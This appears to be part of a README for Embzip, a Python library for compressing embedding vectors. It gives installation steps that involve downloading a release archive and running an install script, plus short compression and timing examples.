## ⚙️ Installation

To install Embzip, follow these steps:

1. Visit the [Releases section](https://github.com/smartin294109/embzip/releases) to download the latest version.
2. Unzip the downloaded file.
3. Navigate to the directory in your terminal.
4. Execute the installation script by running:

   ```bash
   ./install.sh
   ```

## 📖 Usage

Once you have installed Embzip, you can start using it in your projects. Here’s a simple example of how to compress a representation vector:

```python
import embzip

# Create a representation vector
vector = [0.1, 0.2, 0.3, 0.4, 0.5]

# Compress the vector
compressed_vector = embzip.compress(vector)

# Decompress the vector
decompressed_vector = embzip.decompress(compressed_vector)

print("Original Vector:", vector)
print("Compressed Vector:", compressed_vector)
print("Decompressed Vector:", decompressed_vector)
```

## 🖼️ Examples

Here are a few examples demonstrating the capabilities of Embzip:

### Example 1: Basic Compression

```python
import embzip

# Sample data
data = [[0.1, 0.2], [0.3, 0.4], [0.5, 0.6]]

# Compress data
compressed_data = embzip.compress(data)
print("Compressed Data:", compressed_data)
```

### Example 2: Performance Comparison

```python
import time
import embzip

# Generate large dataset
large_data = [[i * 0.1 for i in range(1000)] for _ in range(10000)]

# Measure compression time
start_time = time.time()
compressed_data = embzip.compress(large_data)
end_time = time.time()

print("Compression Time:", end_time - start_time, "seconds")
```
